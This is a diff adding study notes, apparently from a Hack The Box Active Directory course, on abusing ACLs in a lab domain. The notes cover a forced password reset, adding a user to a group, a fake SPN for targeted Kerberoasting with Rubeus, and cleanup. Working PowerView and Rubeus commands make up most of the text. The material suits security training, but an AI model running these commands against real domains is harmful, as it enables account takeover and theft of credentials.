@@ -1347,3 +1347,86 @@ PS C:\htb> Get-DomainGroup -Identity "Help Desk Level 1" | select memberof
     - More info on the specific right, tools, and commands that can be used to pull off this attack
     - Operational Security (Opsec) considerations
     - External references.
+
+### Abusing ACLs
+- Example:
+    ![wley_path](/images/wley_path.jpg) 
+
+    1. Use the wley user to change the password for the damundsen user
+    2. Authenticate as the damundsen user and leverage GenericWrite rights to add a user that we control to the Help Desk Level 1 group
+    3. Take advantage of nested group membership in the Information Technology group and leverage GenericAll rights to take control of the adunn user
+
+1. 
+    - So, first, we must authenticate as wley and force change the password of the user damundsen.
+    ```powershell
+    # Creating a PSCredential Object
+    PS C:\htb> $SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force
+    PS C:\htb> $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword) 
+
+    ```
+    - Next, we must create a `SecureString` object which represents the password we want to set for the target user damundsen.
+    ```powershell
+    # Creating a SecureString Object
+    PS C:\htb> $damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
+
+    # Changing the User's Password
+    PS C:\htb> Import-Module .\PowerView.ps1
+    PS C:\htb> Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
+    ```
+2. 
+    - Authenticate as the damundsen user and add ourselves to the Help Desk Level 1 group.
+    ```powershell
+    # Creating a SecureString Object using damundsen
+    PS C:\htb> $SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
+    PS C:\htb> $Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword) 
+    ```
+    - We can first confirm that our user is not a member of the target group.
+    ```powershell
+    PS C:\htb> Get-ADGroup -Identity "Help Desk Level 1" -Properties * | Select -ExpandProperty Members
+    ```
+    - We can use the `Add-DomainGroupMember` function to add ourselves to the target group.
+    ```powershell
+    PS C:\htb> Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose
+
+    # Confirming damundsen was Added to the Group
+    PS C:\htb> Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName
+
+    ```
+
+- adunn user is an admin account that cannot be interrupted. Since we have `GenericAll` rights over this account, we can have even more fun and perform a targeted Kerberoasting attack by modifying the account's `servicePrincipalName` attribute to create a fake SPN that we can then Kerberoast to obtain the TGS ticket and (hopefully) crack the hash offline using Hashcat.
+
+3. 
+    - We can now use `Set-DomainObject` to create the fake SPN. We could use the tool [targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast) to perform this same attack from a Linux host, and it will create a temporary SPN, retrieve the hash, and delete the temporary SPN all in one command.
+    ```powershell
+    # Creating a Fake SPN
+    PS C:\htb> Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
+
+    # Kerberoasting with Rubeus
+    PS C:\htb> .\Rubeus.exe kerberoast /user:adunn /nowrap
+
+    ```
+    - Great! We have successfully obtained the hash. The last step is to attempt to crack the password offline using Hashcat. Once we have the cleartext password, we could now authenticate as the adunn user and perform the DCSync attack.
+
+
+#### Cleanup
+- In terms of cleanup, there are a few things we need to do:
+
+    1. Remove the fake SPN we created on the adunn user.
+    2. Remove the damundsen user from the Help Desk Level 1 group
+    3. Set the password for the damundsen user back to its original value (if we know it) or have our client set it/alert the user
+
+- This order is important because if we remove the user from the group first, then we won't have the rights to remove the fake SPN.
+
+```powershell
+# Removing the Fake SPN from adunn's Account
+PS C:\htb> Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose
+
+# Removing damundsen from the Help Desk Level 1 Group
+PS C:\htb> Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose
+
+
+# Confirming damundsen was Removed from the Group
+PS C:\htb> Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName |? {$_.MemberName -eq 'damundsen'} -Verbose
+
+
+```
